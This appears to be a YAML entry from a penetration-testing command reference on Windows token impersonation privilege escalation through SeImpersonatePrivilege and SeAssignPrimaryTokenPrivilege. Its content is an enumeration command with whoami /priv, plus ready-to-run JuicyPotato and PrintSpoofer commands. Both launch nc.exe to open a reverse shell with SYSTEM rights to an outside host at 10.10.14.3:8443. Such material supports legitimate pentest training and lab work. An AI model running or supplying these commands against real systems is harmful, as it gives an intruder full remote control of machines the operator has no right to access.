---
description: |
  Enumerate and exploit Windows token impersonation privileges (SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege) for privilege escalation. Demonstrates how attackers can leverage these privileges using tools like JuicyPotato and PrintSpoofer to escalate from service accounts to SYSTEM, highlighting the risk of misconfigured token privileges in post-exploitation scenarios.

  Command Reference:

      Target: Local Windows machine with token impersonation privileges

command: |
  whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"

code: |
  c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
  c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"

items:
  -
services:
  -
OS:
  - Windows
attack_types:
  - Enumeration
  - Privilege Escalation
references:
  - https://www.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/token-privileges
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/
  - https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/securing-active-directory
---